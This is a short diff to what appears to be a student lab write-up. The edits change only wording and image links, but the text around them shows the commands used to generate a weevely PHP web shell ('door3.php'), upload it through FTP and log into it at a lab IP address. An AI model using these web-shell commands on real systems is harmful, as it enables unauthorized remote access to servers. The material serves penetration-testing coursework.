@@ -28,17 +28,15 @@ First I used the following command to generate weevely:
 
 `weevely generate LOL /home/champuser/Desktop/week8/door3.php`
 
-And then uploaded the files inside the ftp server:
+And then uploaded the file inside the ftp server:
 
-![image-20221105225453633](./images/image-20221105225453633-1667703318706-2.png)
+![2](./images/2.png)
 
 Next I used the following command to login:
 
 `weevely http://10.0.5.25/upload/door3.php LOL`
 
-![image-20221105225909689](./images/image-20221105225909689-1667703552797-4.png)
-
-
+![3](./images/3.png)
 
 
 
